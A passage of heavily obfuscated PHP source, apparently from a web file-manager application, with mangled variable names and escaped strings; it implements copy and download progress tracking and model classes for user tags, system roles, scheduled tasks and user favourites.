$œ∂Å¸µˆ[$≈ÖèÖ»Æ[1695]] = $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1694]] + $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1691]] * 0.5; } else { if ($œ∂Å¸µˆ[$≈ÖèÖ»Æ[1692]] == $≈ÖèÖ»Æ[108]) { $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1695]] = $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1694]] + $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1690]] * 0.5 + $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1691]] * 0.5; } } } } $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1644]] = $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1695]] / $œ∂Å¸µˆ[$≈ÖèÖ»Æ[756]]; if ($œ∂Å¸µˆ[$≈ÖèÖ»Æ[1644]] > 0) { $ÙÛÏÑ˜˚ = timeFloat() - $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1646]] - $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1649]]; $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1650]] = $ÙÛÏÑ˜˚ * (1 - $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1644]]) / $œ∂Å¸µˆ[$≈ÖèÖ»Æ[1644]]; } } public function addPath($ê⁄°≠Ã‰) { $ãÊ¿ÙªØ =& $_SERVER[Çâä∆◊¡]; if (!$ê⁄°≠Ã‰) { return; } $¿¬á‰ß÷ =& $this->task; $˝˘’◊Ñ‰ = IO::infoWithChildren($ê⁄°≠Ã‰); $ ∞ı°•â = $¿¬á‰ß÷[$ãÊ¿ÙªØ[1699]] ? $¿¬á‰ß÷[$ãÊ¿ÙªØ[1699]][$ãÊ¿ÙªØ[1700]] : 0; $¿¬á‰ß÷[$ãÊ¿ÙªØ[1699]] = array($ãÊ¿ÙªØ[1700] => $ ∞ı°•â + 1, $ãÊ¿ÙªØ[421] => $˝˘’◊Ñ‰[$ãÊ¿ÙªØ[32]], $ãÊ¿ÙªØ[78] => $˝˘’◊Ñ‰[$ãÊ¿ÙªØ[78]], $ãÊ¿ÙªØ[519] => $˝˘’◊Ñ‰[$ãÊ¿ÙªØ[519]] ? $˝˘’◊Ñ‰[$ãÊ¿ÙªØ[519]] : $˝˘’◊Ñ‰[$ãÊ¿ÙªØ[78]]); if ($˝˘’◊Ñ‰[$ãÊ¿ÙªØ[33]] == $ãÊ¿ÙªØ[192]) { $¿¬á‰ß÷[$ãÊ¿ÙªØ[779]] += 1; } else { $¿¬á‰ß÷[$ãÊ¿ÙªØ[779]] += $˝˘’◊Ñ‰[$ãÊ¿ÙªØ[83]][$ãÊ¿ÙªØ[81]]; if ($˝˘’◊Ñ‰[$ãÊ¿ÙªØ[403]]) { $¿¬á‰ß÷[$ãÊ¿ÙªØ[779]] += $˝˘’◊Ñ‰[$ãÊ¿ÙªØ[83]][$ãÊ¿ÙªØ[82]] + 1; } } $¿¬á‰ß÷[$ãÊ¿ÙªØ[756]] += $˝˘’◊Ñ‰[$ãÊ¿ÙªØ[80]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($â¥Éá≥Ö) { $Î…ŒÒÅ¥ =& $_SERVER[Çâä∆◊¡]; $ı©Ï÷”Å =& $this->task; $ı©Ï÷”Å[$Î…ŒÒÅ¥[1688]] = $â¥Éá≥Ö[$Î…ŒÒÅ¥[32]]; $ı©Ï÷”Å[$Î…ŒÒÅ¥[1051]] = $â¥Éá≥Ö[$Î…ŒÒÅ¥[32]]; $this->update(); } public function copyFileStart($ô†‡∫˘Ì, $Û˝™⁄Õ‡, $øÄ¥÷Ã’, $ƒµ¬áæÓ, $î‡¶ÁŸ, $–ìôÑ‡é) { $≠«ÇÿÊ  =& $_SERVER[Çâä∆◊¡]; $®àª¢ºá = $î‡¶ÁŸ; if ($®àª¢ºá == $GLOBALS[$≠«ÇÿÊ [1701]]) { $®àª¢ºá = $GLOBALS[$≠«ÇÿÊ [1702]]; } $GLOBALS[$≠«ÇÿÊ [1702]] = $î‡¶ÁŸ; $GLOBALS[$≠«ÇÿÊ [1701]] = $–ìôÑ‡é; $ÅÈä•≈Í =& $this->task; $ÅÈä•≈Í[$≠«ÇÿÊ [1688]] = $®àª¢ºá; $ÅÈä•≈Í[$≠«ÇÿÊ [1690]] = (int) $ô†‡∫˘Ì->size($Û˝™⁄Õ‡); $ÅÈä•≈Í[$≠«ÇÿÊ [1691]] = 0; $ÅÈä•≈Í[$≠«ÇÿÊ [1051]] = $≠«ÇÿÊ [12]; $ÅÈä•≈Í[$≠«ÇÿÊ [1692]] = $≠«ÇÿÊ [12]; $ÅÈä•≈Í[$≠«ÇÿÊ [1693]] = 0; $òø≥òØ‘ = $ÅÈä•≈Í[$≠«ÇÿÊ [1690]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ÅÈä•≈Í[$≠«ÇÿÊ [401]] . $≠«ÇÿÊ [1703]); if ($òø≥òØ‘ && file_exists(get_path_father($ƒµ¬áæÓ))) { Cache::set($ÅÈä•≈Í[$≠«ÇÿÊ [401]] . $≠«ÇÿÊ [1703], $ƒµ¬áæÓ); $ÅÈä•≈Í[$≠«ÇÿÊ [1664]] = array($≠«ÇÿÊ [1704], $≠«ÇÿÊ [1705]); } $this->update(0, $òø≥òØ‘); } public static function updateCopyLocalFileSize($ÖÌ‚Ñåì) { $ÚÕÃØùà =& $_SERVER[Çâä∆◊¡]; $ÿì¥»ﬂ≥ = Cache::get($ÖÌ‚Ñåì[$ÚÕÃØùà[401]] . $ÚÕÃØùà[1703]); if (!$ÿì¥»ﬂ≥ || !file_exists($ÿì¥»ﬂ≥)) { return $ÖÌ‚Ñåì; } $ÖÌ‚Ñåì[$ÚÕÃØùà[1691]] = @filesize($ÿì¥»ﬂ≥); $ÖÌ‚Ñåì[$ÚÕÃØùà[1695]] += $ÖÌ‚Ñåì[$ÚÕÃØùà[1691]]; self::updateTask($ÖÌ‚Ñåì); return $ÖÌ‚Ñåì; } public function copyFileEnd($âôﬁ—å∆, $û∏ÕªπÛ, $ƒ™Û¯‰´, $˘˝ñı∆°, $ı•ÆΩ¬–, $˚ËéîÉ˘) { $≠•õ„ö∫ =& $_SERVER[Çâä∆◊¡]; $òÙ»Ø›é =& $this->task; $òÙ»Ø›é[$≠•õ„ö∫[1691]] = $òÙ»Ø›é[$≠•õ„ö∫[1690]]; $òÙ»Ø›é[$≠•õ„ö∫[1692]] = $≠•õ„ö∫[12]; unset($òÙ»Ø›é[$≠•õ„ö∫[1664]]); if ($ı•ÆΩ¬– == $òÙ»Ø›é[$≠•õ„ö∫[1688]]) { $òÙ»Ø›é[$≠•õ„ö∫[1694]] += $òÙ»Ø›é[$≠•õ„ö∫[1690]]; $òÙ»Ø›é[$≠•õ„ö∫[1695]] = $òÙ»Ø›é[$≠•õ„ö∫[1694]]; $this->update(1); } else { $this->update(); $òÙ»Ø›é[$≠•õ„ö∫[1691]] = 0; } Cache::remove($òÙ»Ø›é[$≠•õ„ö∫[401]] . $≠•õ„ö∫[1703]); self::log($≠•õ„ö∫[1706] . $û∏ÕªπÛ . $≠•õ„ö∫[70] . $˘˝ñı∆° . $≠•õ„ö∫[226] . $ı•ÆΩ¬– . $≠•õ„ö∫[1707] . $òÙ»Ø›é[$≠•õ„ö∫[1688]]); } public function updateFileEnd($ÇÅÚ•ı∏, $ã î”‚∫) { $€´Ö˚Ë‘ =& $_SERVER[Çâä∆◊¡]; $Ë‹∫Ö¯› =& $this->task; $Ë‹∫Ö¯›[$€´Ö˚Ë‘[1688]] = $ÇÅÚ•ı∏; $Ë‹∫Ö¯›[$€´Ö˚Ë‘[1690]] = $ã î”‚∫; $Ë‹∫Ö¯›[$€´Ö˚Ë‘[1694]] += $ã î”‚∫; $Ë‹∫Ö¯›[$€´Ö˚Ë‘[1695]] = $Ë‹∫Ö¯›[$€´Ö˚Ë‘[1694]]; $this->update(1); self::log($€´Ö˚Ë‘[1708] . $ÇÅÚ•ı∏); } public function sourceModelCopy($∏ç∆ìÄÖ) { $ıµå∂–ü =& $_SERVER[Çâä∆◊¡]; $ô’ΩôûÈ = $∏ç∆ìÄÖ[0]; $√≤ôõ∫î = $∏ç∆ìÄÖ[1]; $Ü≤°ÙŸó =& $this->task; $this->sourceModelCopyFlag = !0; $Ãõ± ê€ = 0; switch ($ô’ΩôûÈ) { case $ıµå∂–ü[566]: $Ãõ± ê€ = 1; break; case $ıµå∂–ü[569]: $Ü≤°ÙŸó[$ıµå∂–ü[1688]] = $√≤ôõ∫î[$ıµå∂–ü[32]]; break; case $ıµå∂–ü[571]: $Ãõ± ê€ = intval($∏ç∆ìÄÖ[$ıµå∂–ü[375]] * 0.4); break; case $ıµå∂–ü[573]: $Ãõ± ê€ = intval($∏ç∆ìÄÖ[$ıµå∂–ü[375]] * 0.2); break; case $ıµå∂–ü[575]: $Ãõ± ê€ = intval($∏ç∆ìÄÖ[$ıµå∂–ü[375]] * 0.4); break; } $this->update($Ãõ± ê€); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Ë·Ä€ÀØ, $µÑ¥ÿ¥†) { $ıûóó≈† =& $_SERVER[Çâä∆◊¡]; $this->sourceModelCopyFlag = !0; $Òõ˚Ô¡¨ = 1; if (isset($Ë·Ä€ÀØ[$ıûóó≈†[83]])) { $Òõ˚Ô¡¨ = $Ë·Ä€ÀØ[$ıûóó≈†[83]][$ıûóó≈†[81]] + $Ë·Ä€ÀØ[$ıûóó≈†[83]][$ıûóó≈†[82]] + 1; } $this->update($Òõ˚Ô¡¨); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÜÒ”√‡·) { $this->sourceRemove($ÜÒ”√‡·, !1); } public function curlProgress($•é™”äÉ, $…îŒ€°…, $ÅÄ√ﬁòÃ, $ó÷íπ“û, $ÀáÙïÁé) { $Û–Õò•´ =& $_SERVER[Çâä∆◊¡]; $º†˘‚á¿ =& $this->task; if ($ÀáÙïÁé > 0) { $º†˘‚á¿[$Û–Õò•´[1051]] = $Û–Õò•´[1709]; $º†˘‚á¿[$Û–Õò•´[1692]] = $Û–Õò•´[108]; if ($º†˘‚á¿[$Û–Õò•´[1690]]) { $º†˘‚á¿[$Û–Õò•´[1691]] = $ÀáÙïÁé; } if ($º†˘‚á¿[$Û–Õò•´[1693]]) { $º†˘‚á¿[$Û–Õò•´[1691]] = $ÀáÙïÁé + $º†˘‚á¿[$Û–Õò•´[1693]]; } } else { if ($ÅÄ√ﬁòÃ > 0) { if ($º†˘‚á¿[$Û–Õò•´[1690]] == $…îŒ€°…) { $º†˘‚á¿[$Û–Õò•´[1691]] = $ÅÄ√ﬁòÃ; $º†˘‚á¿[$Û–Õò•´[1051]] = $Û–Õò•´[1710]; $º†˘‚á¿[$Û–Õò•´[1692]] = $Û–Õò•´[1184]; } } } $this->update(); } public function curlProgressStart($£Ω©ıæû) { } public function curlProgressEnd($Ç§ÔÄü ) { $ÓßπÛ¯ =& $_SERVER[Çâä∆◊¡]; $√⁄À≈Ò∆ =& $this->task; $ïΩÉÑ∆ã = curl_getinfo($Ç§ÔÄü ); $é˛≥Ñ˚ø = $ïΩÉÑ∆ã[$ÓßπÛ¯[1711]]; if ($é˛≥Ñ˚ø == -1) { $é˛≥Ñ˚ø = $ïΩÉÑ∆ã[$ÓßπÛ¯[1712]]; } if ($√⁄À≈Ò∆[$ÓßπÛ¯[1692]] == $ÓßπÛ¯[108] && $é˛≥Ñ˚ø) { $√⁄À≈Ò∆[$ÓßπÛ¯[1693]] += $é˛≥Ñ˚ø; } $this->update(); } } goto eß·œÖˆü´; E¯µ≥æ¶¢«: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\x74\x61\147\x4c\x69\x73\164"; public $modelType = "\125\x73\145\162\117\x70\x74\151\157\156"; public $field = array("\156\141\155\145", "\163\x74\171\154\x65", "\x73\157\162\164"); public function listData($Ú“ß»ıÎ = false, $Û⁄ü¨ç“ = "\163\x6f\162\164", $ÀÆÒ§¨¯ = false) { return parent::listData($Ú“ß»ıÎ, $Û⁄ü¨ç“, $ÀÆÒ§¨¯); } public function remove($Ω±«©ıù) { return parent::remove($Ω±«©ıù); } public function add($ïû™ªï€, $õÊ´ï≥° = "\154\141\142\x65\154\55\x67\162\x65\171\55\156\x6f\x72\155\x61\154") { $¡≥„Ø≥Œ =& $_SERVER[Çâä∆◊¡]; if ($this->findByName($ïû™ªï€)) { return !1; } $Ëî≈üü„ = array($¡≥„Ø≥Œ[421] => $ïû™ªï€, $¡≥„Ø≥Œ[484] => $õÊ´ï≥°, $¡≥„Ø≥Œ[1814] => $this->getSort($¡≥„Ø≥Œ[253]) + 1); return parent::insert($Ëî≈üü„); } public function update($ˆàõâ÷Ï, $˙œ§˝¶˙) { $ËË Óƒã =& $_SERVER[Çâä∆◊¡]; $îÀ≈Ø•ì = $this->listData($ˆàõâ÷Ï); $ú¢……ã´ = $this->findByName($˙œ§˝¶˙[$ËË Óƒã[32]]); if (!$îÀ≈Ø•ì || $ú¢……ã´ && $ú¢……ã´[$ËË Óƒã[401]] != $îÀ≈Ø•ì[$ËË Óƒã[401]]) { return !1; } return parent::update($ˆàõâ÷Ï, $˙œ§˝¶˙); } public function moveTop($äéíüüﬁ) { $Î∫ëƒ„ë =& $_SERVER[Çâä∆◊¡]; $õòèÁ°õ = parent::listData(); $™ÇØñÌÔ = $this->getSort($Î∫ëƒ„ë[252]); foreach ($õòèÁ°õ as &$çŸÕ€⁄Á) { if ($çŸÕ€⁄Á[$Î∫ëƒ„ë[401]] == $äéíüüﬁ) { $çŸÕ€⁄Á[$Î∫ëƒ„ë[1833]] = $™ÇØñÌÔ; continue; } $çŸÕ€⁄Á[$Î∫ëƒ„ë[1833]] += 1; } unset($çŸÕ€⁄Á); return parent::resetData($õòèÁ°õ); } public function moveBottom($Ë–¿∂†∏) { $›¿∞ ¨á =& $_SERVER[Çâä∆◊¡]; $µÁ‰˝Ïˆ = $this->getSort($›¿∞ ¨á[253]) + 1; return parent::update($Ë–¿∂†∏, array($›¿∞ ¨á[1833] => $µÁ‰˝Ïˆ)); } public function resetSort($«‚æåï⁄) { $˛¯æ∞ˆ¶ =& $_SERVER[Çâä∆◊¡]; $”ß’º€˚ = array(); $«‚æåï⁄ = is_array($«‚æåï⁄) ? $«‚æåï⁄ : array(); for ($õîóÏâ¥ = 0; $õîóÏâ¥ < count($«‚æåï⁄); $õîóÏâ¥++) { $”ß’º€˚[$«‚æåï⁄[$õîóÏâ¥] . $˛¯æ∞ˆ¶[12]] = $õîóÏâ¥ + 1; } $ñÑ◊€Áı = parent::listData(); foreach ($ñÑ◊€Áı as &$¢Ω®˘ïã) { $äËÆœêœ = $”ß’º€˚[$¢Ω®˘ïã[$˛¯æ∞ˆ¶[401]]]; $¢Ω®˘ïã[$˛¯æ∞ˆ¶[1833]] = $äËÆœêœ ? $äËÆœêœ : $¢Ω®˘ïã[$˛¯æ∞ˆ¶[1833]]; } unset($¢Ω®˘ïã); return parent::resetData($ñÑ◊€Áı); } private function getSort($“‚ü˛ú∏) { $ıÛÈàìÈ =& $_SERVER[Çâä∆◊¡]; $¥âüºØÿ = parent::listData(); $Âﬁ£…ƒñ = array_to_keyvalue($¥âüºØÿ, $ıÛÈàìÈ[12], $ıÛÈàìÈ[1833]); if (!$Âﬁ£…ƒñ) { $Âﬁ£…ƒñ = array(0); } $Ëºä™˝ˆ = $“‚ü˛ú∏ == $ıÛÈàìÈ[253] ? max($Âﬁ£…ƒñ) : min($Âﬁ£…ƒñ); return intval($Ëºä™˝ˆ); } } goto a¬ÖíéÚ“ﬁ; D◊ÚµÈ◊◊ç: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\162\157\154\145\x4c\x69\x73\164"; public $field = array("\x6e\141\155\x65", "\141\x75\x74\x68", "\154\141\142\145\x6c", "\x64\151\163\160\x6c\141\x79", "\x73\x79\163\164\145\155", "\x64\145\x73\143", "\x69\147\x6e\x6f\x72\145\105\x78\164", "\151\x67\156\x6f\x72\x65\x46\x69\154\x65\x53\151\172\145", "\141\144\x6d\x69\x6e\x69\163\164\x72\x61\164\x6f\x72", "\x73\157\162\164"); public function listData($øÒÆÖΩ„ = false, $ø‰¥¯Î˙ = "\163\157\162\x74", $‡¸“É˙ó = false) { $…≥‚òßØ =& $_SERVER[Çâä∆◊¡]; $Üõ≈…†Ê = parent::listData($øÒÆÖΩ„, $ø‰¥¯Î˙, $‡¸“É˙ó); if (!$øÒÆÖΩ„) { foreach ($Üõ≈…†Ê as $ùæπ¥ãﬂ => $ûõ˛æ˝Ã) { if ($ûõ˛æ˝Ã[$…≥‚òßØ[2003]] == 1) { $Üõ≈…†Ê[$ùæπ¥ãﬂ][$…≥‚òßØ[451]] = LNG($…≥‚òßØ[2229]); } } } return $Üõ≈…†Ê; } public function update($™Ò∆‹∑â, $Åµ˚ûää) { $À≤Ö∞Áù =& $_SERVER[Çâä∆◊¡]; $ü∏ŒÎÎ© = parent::listData($™Ò∆‹∑â); $Œˆï¸ñç = $this->findByName($Åµ˚ûää[$À≤Ö∞Áù[32]]); if (!$ü∏ŒÎÎ© || $Œˆï¸ñç && $Œˆï¸ñç[$À≤Ö∞Áù[401]] != $ü∏ŒÎÎ©[$À≤Ö∞Áù[401]]) { return !1; } if ($Œˆï¸ñç[$À≤Ö∞Áù[2003]] == 1) { $Åµ˚ûää = array($À≤Ö∞Áù[32] => $Åµ˚ûää[$À≤Ö∞Áù[32]], $À≤Ö∞Áù[1832] => $Åµ˚ûää[$À≤Ö∞Áù[1832]]); } $this->filterAuth($Åµ˚ûää[$À≤Ö∞Áù[414]]); return parent::update($™Ò∆‹∑â, $Åµ˚ûää); } public function remove($ø∞Ã€Ÿ∞) { $‡‘Ω…⁄ﬁ = parent::listData($ø∞Ã€Ÿ∞); if (!$‡‘Ω…⁄ﬁ || $‡‘Ω…⁄ﬁ[$_SERVER[Çâä∆◊¡][1261]]) { return !1; } return parent::remove($ø∞Ã€Ÿ∞); } public function add($í˝‹∏Ä·) { $∫∑‹Ë…˘ =& $_SERVER[Çâä∆◊¡]; $êΩÛä≤Ñ = $í˝‹∏Ä·[$∫∑‹Ë…˘[32]]; if ($this->findByName($êΩÛä≤Ñ)) { return !1; } $˙éá£è‚ = array($∫∑‹Ë…˘[421] => $êΩÛä≤Ñ, $∫∑‹Ë…˘[1816] => $∫∑‹Ë…˘[12], $∫∑‹Ë…˘[1812] => $∫∑‹Ë…˘[1820], $∫∑‹Ë…˘[2230] => 1, $∫∑‹Ë…˘[1815] => 0, $∫∑‹Ë…˘[2231] => 0, $∫∑‹Ë…˘[1814] => $this->getSort()); $í˝‹∏Ä· = array_merge($˙éá£è‚, $í˝‹∏Ä·); $this->filterAuth($í˝‹∏Ä·[$∫∑‹Ë…˘[414]]); return parent::insert($í˝‹∏Ä·); } private function getSort() { $Çœõ£÷≠ =& $_SERVER[Çâä∆◊¡]; $≈ÕÁÒÜÈ = parent::listData(); $ıÆÇπÔÌ = array_to_keyvalue($≈ÕÁÒÜÈ, $Çœõ£÷≠[12], $Çœõ£÷≠[1833]); return empty($ıÆÇπÔÌ) ? 0 : max($ıÆÇπÔÌ) + 1; } private function filterAuth(&$≠ßÇ≤•õ) { $÷’ÂªÏ =& $_SERVER[Çâä∆◊¡]; $ø¥Üí”ã = array(); $Ä≈ØÈ∑§ = array_filter(explode($÷’ÂªÏ[50], $≠ßÇ≤•õ)); foreach ($Ä≈ØÈ∑§ as $≠ßÇ≤•õ) { $ñÙ◊≥Èù = explode($÷’ÂªÏ[10], $≠ßÇ≤•õ); if ($ñÙ◊≥Èù[0] == $÷’ÂªÏ[2232] && $ñÙ◊≥Èù[1] != $÷’ÂªÏ[1180]) { $›º∆ÉÁ∏ = $ñÙ◊≥Èù[0] . $÷’ÂªÏ[10] . $ñÙ◊≥Èù[1] . $÷’ÂªÏ[2233]; if (!in_array($›º∆ÉÁ∏, $Ä≈ØÈ∑§)) { $ø¥Üí”ã[] = $›º∆ÉÁ∏; } } $ø¥Üí”ã[] = $≠ßÇ≤•õ; } $≠ßÇ≤•õ = implode($÷’ÂªÏ[50], $ø¥Üí”ã); } public function sort($îü˜¨¶†, $ìØá°€Ø) { return parent::update($îü˜¨¶†, $ìØá°€Ø); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\x74\141\x73\x6b\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\x74\x79\160\145", "\145\166\145\156\x74", "\x74\151\155\x65", "\x64\145\x73\x63", "\163\x79\x73\x74\145\x6d", "\x65\x6e\141\142\x6c\x65", "\x6c\141\163\164\122\165\x6e", "\x73\x6f\x72\x74"); public function listData($ä∏Êú¸∑ = false, $∑⁄ÚÎ ã = "\163\157\x72\164", $™∂“™±‰ = false) { return parent::listData($ä∏Êú¸∑, $∑⁄ÚÎ ã, $™∂“™±‰); } public function add($ºñˆù…ä) { $‹ºˆû‡– =& $_SERVER[Çâä∆◊¡]; $ˆ≠î™Û· = $this->findByName($ºñˆù…ä[$‹ºˆû‡–[32]]); if ($ˆ≠î™Û·) { return !1; } $ºñˆù…ä[$‹ºˆû‡–[1603]] = 0; $ºñˆù…ä[$‹ºˆû‡–[1833]] = $this->getSort(); return parent::insert($ºñˆù…ä); } private function getSort() { $†∞∂≈˜Û =& $_SERVER[Çâä∆◊¡]; $ËõØ®É∏ = parent::listData(); $¥ŒÑÊ˙Ò = array_to_keyvalue($ËõØ®É∏, $†∞∂≈˜Û[12], $†∞∂≈˜Û[1833]); return empty($¥ŒÑÊ˙Ò) ? 0 : max($¥ŒÑÊ˙Ò) + 1; } public function update($Ùåüï›‰, $∞ı´ÛÖ∏) { $ÚéÏØàœ =& $_SERVER[Çâä∆◊¡]; $ÑºÅ¢©ê = $this->listData($Ùåüï›‰); $ÆØ¢‡Ω∞ = $this->findByName($∞ı´ÛÖ∏[$ÚéÏØàœ[32]]); if (!$ÑºÅ¢©ê || $ÆØ¢‡Ω∞ && $ÆØ¢‡Ω∞[$ÚéÏØàœ[401]] != $ÑºÅ¢©ê[$ÚéÏØàœ[401]]) { return !1; } return parent::update($Ùåüï›‰, $∞ı´ÛÖ∏); } public function remove($ﬂõ„πÜÿ, $Ø≈ƒÈ∏£ = false) { $·å√⁄ãÁ =& $_SERVER[Çâä∆◊¡]; $Ì⁄Éœöö = $this->listData($ﬂõ„πÜÿ); if (!$Ì⁄Éœöö) { return; } if (!$Ø≈ƒÈ∏£ && $Ì⁄Éœöö[$·å√⁄ãÁ[1261]] == $·å√⁄ãÁ[89]) { return !1; } return parent::remove($ﬂõ„πÜÿ); } public function enable($Ä‚»û¥√, $∆ßæ÷ƒ©) { return $this->update($Ä‚»û¥√, array($_SERVER[Çâä∆◊¡][2224] => $∆ßæ÷ƒ©)); } public function run($óËÕ∑ÿæ) { return $this->update($óËÕ∑ÿæ, array($_SERVER[Çâä∆◊¡][2234] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($√≤ô„Õ„) { $’¬îááé =& $_SERVER[Çâä∆◊¡]; return array($’¬îááé[1918] => array(USER_ID, $’¬îááé[2235])); } protected function listData() { $å∂≈ùöå =& $_SERVER[Çâä∆◊¡]; $œÀú∂£¡ = array($å∂≈ùöå[1633] => USER_ID, $å∂≈ùöå[483] => 0); $™´Á±£À = $å∂≈ùöå[2236]; $„˛∂Ûù¡ = $this->field($™´Á±£À)->where($œÀú∂£¡)->order($å∂≈ùöå[2237])->select(); return $„˛∂Ûù¡ ? $„˛∂Ûù¡ : array(); } protected function resetCache() { } protected function listView() { $ƒ†›∏∫∫ =& $_SERVER[Çâä∆◊¡]; $Á·““ã¶ = $this->listData(); $˝°†É∂« = array_filter_by_field($Á·““ã¶, $ƒ†›∏∫∫[33], $ƒ†›∏∫∫[417]); $Â˘‹©˚Ÿ = array_to_keyvalue($˝°†É∂«, $ƒ†›∏∫∫[12], $ƒ†›∏∫∫[78]); if (!$Â˘‹©˚Ÿ) { return $Á·““ã¶; } $©÷≠Ëõì = 2000; $Ç⁄ÜÙ≈ó = array($ƒ†›∏∫∫[418] => array($ƒ†›∏∫∫[419], $Â˘‹©˚Ÿ)); $Ω÷îÆÄπ = Model($ƒ†›∏∫∫[818])->listSource($Ç⁄ÜÙ≈ó, $©÷≠Ëõì); $Ω÷îÆÄπ = array_merge($Ω÷îÆÄπ[$ƒ†›∏∫∫[76]], $Ω÷îÆÄπ[$ƒ†›∏∫∫[77]]); $Ω÷îÆÄπ = array_to_keyvalue($Ω÷îÆÄπ, $ƒ†›∏∫∫[403]); foreach ($Á·““ã¶ as $ÒÖæáÁ  => $ÈÉ–∏‡û) { $≥˘ÉçÎœ = $Ω÷îÆÄπ[$ÈÉ–∏‡û[$ƒ†›∏∫∫[78]]]; $≥˘ÉçÎœ = $≥˘ÉçÎœ ? $≥˘ÉçÎœ : array(); $Á·““ã¶[$ÒÖæáÁ ] = array_merge($≥˘ÉçÎœ, $ÈÉ–∏‡û); } return $Á·““ã¶; } protected function addFav($áöÓ«†ç, $œ˝åû›ø = '', $ˆñ∆¥∆÷ = "\x73\x6f\165\x72\x63\x65") { $€•‘¡Òº =& $_SERVER[Çâä∆◊¡]; $ø†ºíπÒ = array($€•‘¡Òº[1633] => USER_ID, $€•‘¡Òº[483] => 0, $€•‘¡Òº[423] => $ˆñ∆¥∆÷, $€•‘¡Òº[422] => $áöÓ«†ç); if ($this->where($ø†ºíπÒ)->find()) { return !1; } $ø†ºíπÒ = array($€•‘¡Òº[1633] => USER_ID, $€•‘¡Òº[483] => 0); $÷Ëﬂª≥Î = $this->where($ø†ºíπÒ)->max($€•‘¡Òº[1833]); if (!$÷Ëﬂª≥Î) { $÷Ëﬂª≥Î = 0; } if (!$œ˝åû›ø && $ˆñ∆¥∆÷ == $€•‘¡Òº[417]) { $ê£Ø†ìÂ = Model($€•‘¡Òº[1312])->where(array($€•‘¡Òº[418] => $áöÓ«†ç))->find(); if (!$ê£Ø†ìÂ) { return !1; } $œ˝åû›ø = $ê£Ø†ìÂ[$€•‘¡Òº[32]]; } $œ˝åû›ø = $this->getAutoName($œ˝åû›ø); $ñó€¡ÓÛ = array($€•‘¡Òº[1633] => USER_ID, $€•‘¡Òº[483] => 0, $€•‘¡Òº[421] => $œ˝åû›ø, $€•‘¡Òº[422] => $áöÓ«†ç, $€•‘¡Òº[423] => $ˆñ∆¥∆÷, $€•‘¡Òº[1814] => $÷Ëﬂª≥Î + 1); return $this->add($ñó€¡ÓÛ); } protected function remove($Ÿ‚‰¿˛‰) { $ˆÒÔ±Ôÿ =& $_SERVER[Çâä∆◊¡]; $™ﬁ€Ø¸â = array($ˆÒÔ±Ôÿ[1633] => USER_ID, $ˆÒÔ±Ôÿ[420] => $Ÿ‚‰¿˛‰); return $this->where($™ﬁ€Ø¸â)->delete(); } protected function removeByName($ı°È÷•¢) { $ˆòñúâÇ =& $_SERVER[Çâä∆◊¡]; $ì‡∏ùøÌ = array($ˆòñúâÇ[1633] => USER_ID, $ˆòñúâÇ[421] => $ı°È÷•¢, $ˆòñúâÇ[483] => 0); return $this->where($ì‡∏ùøÌ)->delete(); } protected function rename($æ≠‹ÿ®é, $¯ΩÈ˛¥) { $µ·¶ÿ‡– =& $_SERVER[Çâä∆◊¡]; if ($æ≠‹ÿ®é == $¯ΩÈ˛¥) { return !1; } $¢ªÃÊ¿ï = $this->getAutoName($¯ΩÈ˛¥); if ($¯ΩÈ˛¥ != $¢ªÃÊ¿ï) { return !1; } $Ìú‰í˛† = array($µ·¶ÿ‡–[1633] => USER_ID, $µ·¶ÿ‡–[483] => 0, $µ·¶ÿ‡–[32] => $æ≠‹ÿ®é); return $this->where($Ìú‰í˛†)->save(array($µ·¶ÿ‡–[32] => $¯ΩÈ˛¥)); } protected function resetSort($Û…øÒÆÓ) { $Ô√¶éå‰ =& $_SERVER[Çâä∆◊¡]; $Û…øÒÆÓ = is_array($Û…øÒÆÓ) ? $Û…øÒÆÓ : array(); $õß˙Âø¸ = array($Ô√¶éå‰[1633] => USER_ID); for ($ÍßÎøêÁ = 0; $ÍßÎøêÁ < count($Û…øÒÆÓ); $ÍßÎøêÁ++) { $õß˙Âø¸[$Ô√¶éå‰[420]] = $Û…øÒÆÓ[$ÍßÎøêÁ]; $this->where($õß˙Âø¸)->save(array($Ô√¶éå‰[1814] => $ÍßÎøêÁ + 1)); } return !0; } protected function moveTop($‘Ïÿı¢ö) { $‡†¥∆˙˝ =& $_SERVER[Çâä∆◊¡]; $Ê‚·Ä≤º = array($‡†¥∆˙˝[1633] => USER_ID, $‡†¥∆˙˝[483] => 0); $Õ∞íÂïŒ = $this->where($Ê‚·Ä≤º)->where(array($‡†¥∆˙˝[32] => $‘Ïÿı¢ö))->find(); if (!$Õ∞íÂïŒ) { return; } $ÆÍ˙ŒÍ‚ = $this->field($‡†¥∆˙˝[401])->where($Ê‚·Ä≤º)->order($‡†¥∆˙˝[2237])->select(); $ÆÍ˙ŒÍ‚ = array_to_keyvalue($ÆÍ˙ŒÍ‚, $‡†¥∆˙˝[12], $‡†¥∆˙˝[401]); $ΩöæÎò = $ÆÍ˙ŒÍ‚; $ÆÍ˙ŒÍ‚ = array_remove_value($ÆÍ˙ŒÍ‚, $Õ∞íÂïŒ[$‡†¥∆˙˝[401]]); array_unshift($ÆÍ˙ŒÍ‚, $Õ∞íÂïŒ[$‡†¥∆˙˝[401]]); return $this->resetSort($ÆÍ˙ŒÍ‚); } protected function 